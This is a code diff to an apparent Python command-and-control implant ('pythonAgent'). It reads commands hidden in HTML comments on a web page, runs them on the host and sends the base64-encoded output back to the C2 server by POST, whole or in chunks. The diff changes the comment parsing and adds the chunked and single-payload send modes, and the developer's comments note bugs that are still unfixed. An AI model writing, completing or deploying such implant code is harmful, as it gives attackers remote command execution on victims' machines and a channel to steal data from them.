@@ -24,12 +24,9 @@ class pythonAgent:
 
     def run(self):
         """Runs the rest of the commands ot be able to execute on the server"""
-        # Makes Request to the server for text
-        text = self._make_request()
         # Text is parsed and commands are extracted
-        command_list = self._extract_html(text)
-
-        stdout = None
+        command_list = self._extract_html()
+        stdout = ""
         # Commands are passed to be executed
         if command_list:
             stdout = self._execute_command(command_list)
@@ -47,11 +44,14 @@ class pythonAgent:
 
         return r.text
 
-    def _extract_html(self, text):
+    def _extract_html(self):
         """
         Extracts given commands from the HTML including any updates to domain and more
         """
         text = self._make_request()
+        # FIX: It seems that that the text that is obtained from the pages are inconsistent sometimes, at times it gets the comments, at times it doesn't
+        # This is likely an error on the server side. But I am not entirely sure, as these are static files so we should be fine
+        # print(f"HTML TEXT: {text}")
 
         # Searches through all of the html comments on a given webpage
         soup = BeautifulSoup(text, "html.parser")
@@ -59,19 +59,17 @@ class pythonAgent:
 
         # Process each comment to eliminate whitespace and create lists delimited by spaces
         processed_comments = []
-        for comment in comments:
-            # Strip whitespace and split into words (this removes \n and creates a list)
-            words = comment.strip().split()
-            # We utilize extend here, as it takes the contents from words, and adds to process_comments
-            processed_comments.extend(words)
 
-        print(processed_comments)
+        if comments:
+            for comment in comments:
+                # Strip whitespace and split into words (this removes \n and creates a list)
+                words = comment.strip().split()  # type: ignore
+                # We utilize extend here, as it takes the contents from words, and adds to process_comments
+                processed_comments.extend(words)
 
-        return processed_comments
-        # parses:
-        # commands
-        # domain currently being used
-        # updates to how the commands will be encoded??
+            return processed_comments
+
+        return False
 
     def _execute_command(self, command_list):
         """
@@ -100,49 +98,71 @@ class pythonAgent:
 
         return result.stdout
 
-    def _send_results(self, stdout):
+    def _send_results(self, stdout, chunks: bool = False):
         """
         Sends the results of a command back to the C2 server via a POST.
         - stdout: the string output from the command (could be empty on error).
         """
         # Encode the stdout in base64 to be later decoded
+        # FIX:Pretty sure that I am not encoding here, please fix
         b64_output = base64.b64encode(stdout.encode()).decode()
 
-        # Chunking the message out into smaller chunks that are then sent to the server and recomposed on that end
-        chunk_size = 20
-        total_len = len(b64_output)
-        chunk_count = math.ceil(total_len / chunk_size)
         # Generate a random uuid for the message id
         message_id = str(uuid.uuid4())
 
         # Set the endpoint that the json will communicate back to, this is determined by the agent compot
         url = self.domain + self.commEndPoint
 
-        # Go through the chunk count and generate the code
-        for i in range(chunk_count):
-            start = i * chunk_size
-            end = start + chunk_size
-            chunk = b64_output[start:end]
+        session = requests.Session()
 
-            # Generate a json payload to be sent back to the server
-            payload = {
-                "timestamp": int(time.time()),  # epoch seconds
-                "message_id": message_id,
-                "agent_id": self.agentId,
-                "chunk_index": i,
-                "chunk_size": chunk_size,
-                "chunk_count": chunk_count,
-                "chunk_data": chunk,
-            }
+        if chunks:
+            # Chunking the message out into smaller chunks that are then sent to the server and recomposed on that end
+            chunk_size = 20
+            total_len = len(b64_output)
+            chunk_count = math.ceil(total_len / chunk_size)
 
-            # Attempt to send this using a HTML POSt and sending over the json
-            try:
-                r = requests.post(url, json=payload, timeout=5)
-                r.raise_for_status()
-                print(f"[+] Results successfully sent (status {r.status_code})")
-            except requests.RequestException as e:
-                # Flesh out with more information on what to do if this fails...
-                print(f"[-] Failed to send results: {e}")
+            for i in range(chunk_count):
+                start = i * chunk_size
+                end = start + chunk_size
+                chunk = b64_output[start:end]
+
+                payload = {
+                    "timestamp": int(time.time()),  # epoch seconds
+                    "message_id": message_id,
+                    "agent_id": self.agentId,
+                    "chunk_index": i,
+                    "chunk_size": chunk_size,
+                    "chunk_count": chunk_count,
+                    "chunk_data": chunk,
+                }
+
+                # Attempt to send this using a HTML POSt and sending over the json
+                try:
+                    r = session.post(url, json=payload, timeout=5)
+                    r.raise_for_status()
+                    print(f"[+] Results successfully sent (status {r.status_code})")
+                except requests.RequestException as e:
+                    # TODO: Add more information to here in the event of a failure? Maybe a response back to the server?
+                    print(f"[-] Failed to send results: {e}")
+
+        # otherwsie send the entire message as a single payload:
+        payload = {
+            "timestamp": int(time.time()),  # epoch seconds
+            "message_id": message_id,
+            "agent_id": self.agentId,
+            "chunk_index": 0,
+            "chunk_size": len(b64_output),
+            "chunk_count": 1,
+            "chunk_data": b64_output,
+        }
+
+        try:
+            r = session.post(url, json=payload, timeout=5)
+            r.raise_for_status()
+            print(f"[+] Results successfully sent (status {r.status_code})")
+        except requests.RequestException as e:
+            # TODO: Add more information to here in the event of a failure? Maybe a response back to the server?
+            print(f"[-] Failed to send results: {e}")
 
 
 if __name__ == "__main__":
